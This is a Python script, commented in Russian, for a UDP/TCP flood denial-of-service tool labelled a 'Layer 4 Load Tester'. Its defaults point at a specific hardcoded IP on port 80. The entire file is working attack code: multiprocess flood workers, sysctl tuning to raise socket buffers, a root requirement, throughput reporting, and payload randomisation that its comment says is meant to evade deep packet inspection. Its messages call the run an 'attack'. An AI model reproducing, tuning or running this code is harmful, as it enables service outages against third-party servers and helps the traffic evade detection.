import multiprocessing as mp
import socket
import time
import random
import os
import sys
import threading

# ===================== НАСТРОЙКИ =====================
DEFAULT_IP = "45.139.132.87"
DEFAULT_PORT = 80
# ====================================================

def set_system_limits():
    """Повышаем лимиты системы (root)"""
    try:
        os.system("sysctl -w net.core.wmem_max=33554432 > /dev/null 2>&1")
        os.system("sysctl -w net.core.rmem_max=33554432 > /dev/null 2>&1")
        os.system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' > /dev/null 2>&1")
        print("[+] Системные лимиты повышены для максимальной производительности")
    except:
        pass


def udp_flood_worker(target_ip, target_port, packet_size, worker_id):
    """Оптимизированный UDP flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64*1024*1024)  # 64MB
        sock.setblocking(False)
        
        payload = random.randbytes(packet_size)
        target = (target_ip, target_port)
        packets = 0
        start_time = time.time()
        
        print(f"[UDP-{worker_id}] Запущен → {target_ip}:{target_port} | Packet: {packet_size} bytes")
        
        while True:
            try:
                sock.sendto(payload, target)
                packets += 1
                
                if packets % 100000 == 0:
                    payload = random.randbytes(packet_size)  # анти-DPI
                    elapsed = time.time() - start_time
                    if elapsed > 0:
                        speed = (packets * packet_size * 8) / (elapsed * 1_000_000_000)
                        print(f"[UDP-{worker_id}] ≈ {speed:.2f} Gbps | Packets: {packets:,}")
            except BlockingIOError:
                time.sleep(0.00001)
            except Exception:
                time.sleep(0.001)
    except Exception as e:
        print(f"[UDP-{worker_id}] Error: {e}")


def tcp_flood_worker(target_ip, target_port, packet_size, worker_id):
    """Оптимизированный TCP flood"""
    payload = random.randbytes(packet_size)
    print(f"[TCP-{worker_id}] Запущен → {target_ip}:{target_port} | Packet: {packet_size} bytes")
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16*1024*1024)
            sock.settimeout(3)
            sock.connect((target_ip, target_port))
            
            for _ in range(50):  # burst
                try:
                    sock.sendall(payload)
                except:
                    break
                    
            sock.close()
        except:
            time.sleep(0.01)


def main():
    print("=== Layer 4 Load Tester v2.0 (Optimized for 2 cores + Root) ===\n")
    
    target_ip = input(f"Insert Target IP (default: {DEFAULT_IP}): ").strip() or DEFAULT_IP
    target_port_input = input(f"Insert Target Port (default: {DEFAULT_PORT}): ").strip() or str(DEFAULT_PORT)
    target_port = int(target_port_input)
    
    method = (input("Select Method (TCP/UDP/BOTH, default BOTH): ").strip().upper() or "BOTH")
    if method not in ["TCP", "UDP", "BOTH"]:
        method = "BOTH"
    
    workers_input = input("Number of workers per method (default 8): ").strip() or "8"
    workers = int(workers_input)
    
    packet_size_input = input("Packet size in bytes (default 8192): ").strip() or "8192"
    packet_size = int(packet_size_input)

    set_system_limits()

    print(f"\n[+] Starting {method} attack on {target_ip}:{target_port}")
    print(f"[+] Workers: {workers} | Packet size: {packet_size} bytes | Cores: {mp.cpu_count()}\n")

    processes = []

    if method in ["UDP", "BOTH"]:
        for i in range(workers):
            p = mp.Process(target=udp_flood_worker, 
                         args=(target_ip, target_port, packet_size, i+1),
                         daemon=True)
            p.start()
            processes.append(p)

    if method in ["TCP", "BOTH"]:
        for i in range(workers):
            p = mp.Process(target=tcp_flood_worker, 
                         args=(target_ip, target_port, packet_size, i+1),
                         daemon=True)
            p.start()
            processes.append(p)

    try:
        while True:
            time.sleep(10)
            print(f"[•] Attack running... (Press Ctrl+C to stop)")
    except KeyboardInterrupt:
        print("\n\n[!] Attack stopped by user.")
        for p in processes:
            if p.is_alive():
                p.terminate()
        sys.exit(0)


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Запусти скрипт от root (sudo)!")
        sys.exit(1)
    
    if sys.platform == 'win32':
        mp.set_start_method('spawn')
    
    main()